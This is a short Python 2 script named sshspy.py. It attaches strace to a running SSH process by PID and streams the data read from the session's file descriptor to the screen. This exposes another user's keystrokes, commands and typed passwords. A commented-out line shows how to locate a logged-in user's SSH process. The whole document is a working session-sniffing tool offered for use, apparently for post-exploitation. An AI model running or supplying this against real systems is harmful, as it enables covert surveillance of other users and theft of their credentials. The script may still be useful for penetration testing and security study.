#!/usr/bin/python

# Author: @nopernik
# git: https://github.com/nopernik
# my blog: http://korznikov.com
# my challenges: http://sudo.co.il

import sys
from subprocess import Popen, PIPE,check_output
import re
import os

if not len(sys.argv[1:]):
	print 'Usage: sshspy.py PID'
	sys.exit(1)

pid = str(int(sys.argv[1]))
#pid = str(int(check_output("ps x|grep $(last|grep logge|awk '{print $2}')|grep ssh|awk '{print $1}'",shell=True)))

print 'Attaching to %s' % pid

sshpipe = Popen(['strace', '-s', '16384', '-p', pid, "-e", \
    "read"], shell=False, stdout=PIPE, stderr=PIPE)

while 1:
	sshpipe.poll()
	output = sshpipe.stderr.readline()
	if 'read(' in output:
		out = re.findall('read\(10, \"(.*)\", [0-9]+\) += [0-9]+',output)
		if isinstance(out,list) and len(out):
			sys.stdout.flush()
			sys.stdout.write(str(out[0].decode('string_escape')))


	elif not output and sshpipe.returncode is not None:
		print "Connection closed"
		break

